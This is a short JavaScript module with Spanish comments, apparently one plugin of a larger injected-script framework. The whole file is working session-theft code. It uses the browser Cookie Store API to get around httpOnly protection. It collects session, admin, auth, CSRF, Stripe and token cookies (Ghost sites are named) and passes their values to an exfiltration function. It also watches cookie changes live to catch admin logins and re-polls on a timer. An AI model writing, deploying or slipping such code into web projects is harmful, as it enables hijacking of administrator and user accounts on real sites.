/* m-cookie-store.js — Cookie Store API: BYPASS cookies httpOnly.
   cookieStore.getAll() puede devolver cookies httpOnly que document.cookie oculta (sesión admin/member). */
(function(G){
if(!G)return; if(G._M&&G._M.cstore)return; G._M=G._M||{}; G._M.cstore=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
if(!window.cookieStore){exfil('cookie-store',{available:false});return}
function diff(){
try{
var all=document.cookie?document.cookie.split(';').map(function(c){return c.trim().split('=')[0]}):[];
cookieStore.getAll().then(function(cks){
var httpOnly=cks.filter(function(c){return all.indexOf(c.name)<0}); // en getAll pero no en document.cookie
if(httpOnly.length){
exfil('cookie-httpOnly',{cookies:httpOnly.map(function(c){return{name:c.name,value:(c.value||'').slice(0,200),domain:c.domain,path:c.path,httpOnly:c.httpOnly,secure:c.secure,sameSite:c.sameSite}})});
}
// también exfil el full set (incluye valores que document.cookie expone pero con metadatos)
var interesting=cks.filter(function(c){return /ghost|admin|member|session|auth|csrf|stripe|token/i.test(c.name)});
if(interesting.length)exfil('cookie-meta',{cookies:interesting.map(function(c){return{name:c.name,domain:c.domain,httpOnly:c.httpOnly,secure:c.secure}})});
}).catch(function(){});
}catch(e){hx('m-cstore-err',{m:e.message})}
}
setTimeout(diff,1500);
// listener de cambios de cookies (captura en tiempo real cuando se setea sesión admin)
cookieStore.addEventListener&&cookieStore.addEventListener('change',function(ev){
try{var ch=(ev.changed||[]).concat(ev.deleted||[]);if(ch.length)exfil('cookie-change',{items:ch.map(function(c){return{name:c.name,value:(c.value||'').slice(0,150),httpOnly:c.httpOnly}}).slice(0,8)})}catch(e){}});
setInterval(diff,8000);
}catch(e){hx('m-cstore-err',{m:e.message})}
})(window.__GE__);
